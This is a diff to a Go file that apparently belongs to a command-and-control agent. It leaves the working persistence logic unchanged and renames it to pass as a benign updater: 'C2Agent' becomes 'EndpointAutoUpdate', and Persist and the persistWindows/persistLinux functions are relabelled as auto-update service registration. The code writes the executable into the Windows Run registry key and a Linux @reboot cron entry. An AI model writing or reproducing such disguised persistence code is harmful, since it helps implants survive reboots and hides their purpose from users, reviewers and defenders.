@@ -8,9 +8,11 @@ import (
 	"strings"
 )
 
-const PersistName = "C2Agent"
+// ServiceLabel is set at init time from the decoded config.
+// Default value is used for dev builds only.
+var ServiceLabel = "EndpointAutoUpdate"
 
-func Persist() error {
+func InstallAutoUpdater() error {
 	exePath, err := os.Executable()
 	if err != nil {
 		return fmt.Errorf("failed to get executable path: %w", err)
@@ -18,30 +20,30 @@ func Persist() error {
 
 	switch runtime.GOOS {
 	case "windows":
-		return persistWindows(exePath)
+		return registerWindowsService(exePath)
 	case "linux":
-		return persistLinux(exePath)
+		return registerLinuxService(exePath)
 	default:
-		return fmt.Errorf("persistence not implemented for %s", runtime.GOOS)
+		return fmt.Errorf("auto-update not implemented for %s", runtime.GOOS)
 	}
 }
 
-func RemovePersistence() error {
+func RemoveAutoUpdater() error {
 	switch runtime.GOOS {
 	case "windows":
 		return removePersistWindows()
 	case "linux":
 		return removePersistLinux()
 	default:
-		return fmt.Errorf("persistence removal not implemented for %s", runtime.GOOS)
+		return fmt.Errorf("auto-update removal not implemented for %s", runtime.GOOS)
 	}
 }
 
-func persistWindows(exePath string) error {
+func registerWindowsService(exePath string) error {
 	cmd := exec.Command(
 		"reg", "add",
 		`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
-		"/v", PersistName,
+		"/v", ServiceLabel,
 		"/t", "REG_SZ",
 		"/d", exePath,
 		"/f",
@@ -51,7 +53,7 @@ func persistWindows(exePath string) error {
 		return fmt.Errorf("registry add failed: %s - %w", string(output), err)
 	}
 
-	fmt.Printf("[+] Persistence installed (Windows registry): %s\n", PersistName)
+	fmt.Printf("[+] Auto-update registered (Windows): %s\n", ServiceLabel)
 	return nil
 }
 
@@ -59,7 +61,7 @@ func removePersistWindows() error {
 	cmd := exec.Command(
 		"reg", "delete",
 		`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
-		"/v", PersistName,
+		"/v", ServiceLabel,
 		"/f",
 	)
 	output, err := cmd.CombinedOutput()
@@ -67,18 +69,18 @@ func removePersistWindows() error {
 		return fmt.Errorf("registry delete failed: %s - %w", string(output), err)
 	}
 
-	fmt.Printf("[-] Persistence removed (Windows registry): %s\n", PersistName)
+	fmt.Printf("[-] Auto-update removed (Windows): %s\n", ServiceLabel)
 	return nil
 }
 
-func persistLinux(exePath string) error {
+func registerLinuxService(exePath string) error {
 	cmd := exec.Command("crontab", "-l")
 	existingCron, _ := cmd.CombinedOutput() // May error if no crontab exists
 
 	cronLine := fmt.Sprintf("@reboot %s &", exePath)
 
 	if strings.Contains(string(existingCron), cronLine) {
-		fmt.Println("[*] Persistence already installed (cron)")
+		fmt.Println("[*] Auto-update already registered (cron)")
 		return nil
 	}
 
@@ -91,7 +93,7 @@ func persistLinux(exePath string) error {
 		return fmt.Errorf("crontab install failed: %s - %w", string(output), err)
 	}
 
-	fmt.Printf("[+] Persistence installed (Linux cron): @reboot %s\n", exePath)
+	fmt.Printf("[+] Auto-update registered (Linux cron): @reboot %s\n", exePath)
 	return nil
 }
 
@@ -126,6 +128,6 @@ func removePersistLinux() error {
 		return fmt.Errorf("crontab update failed: %s - %w", string(output), installErr)
 	}
 
-	fmt.Printf("[-] Persistence removed (Linux cron): %s\n", PersistName)
+	fmt.Printf("[-] Auto-update removed (Linux cron): %s\n", ServiceLabel)
 	return nil
 }
